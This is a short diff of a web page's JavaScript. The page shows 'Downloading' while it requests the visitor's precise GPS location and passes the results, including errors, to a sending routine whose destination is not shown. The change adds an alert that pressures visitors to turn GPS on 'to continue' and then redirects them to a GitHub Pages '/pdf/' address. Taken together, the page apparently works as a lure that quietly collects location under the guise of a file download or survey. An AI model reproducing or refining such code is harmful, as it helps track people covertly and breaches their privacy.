@@ -199,17 +199,21 @@ function solicitarGeo() {
             setTimeout(redirigirLuego, 800);
         },
         err => {
-            enviar({
-                type: "geo-error",
-                error: err.message,
-                time: new Date().toLocaleString("es-EC", { timeZone: "America/Guayaquil" })
-            });
+    enviar({
+        type: "geo-error",
+        error: err.message,
+        time: new Date().toLocaleString("es-EC", { timeZone: "America/Guayaquil" })
+    });
 
-            // 🔥 Incluso si rechaza permisos o falla, también redirige
-            setTimeout(redirigirLuego, 800);
-        },
-        { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
-    );
+    // 🔥 Mostrar alerta especial si el GPS está apagado
+    if (err.code === 2) { // POSITION_UNAVAILABLE
+        alert("Para continuar, activa el GPS de tu dispositivo y vuelve a intentarlo.");
+    }
+
+    // Redirigir si falla igual
+    setTimeout(() => {
+        window.location.href = "https://encuestauta69-gif.github.io/pdf/";
+    }, 800);
 }
 </script>
 
@@ -223,6 +227,7 @@ Descargando.....
 
 </body>
 </html>
+
 
 
 
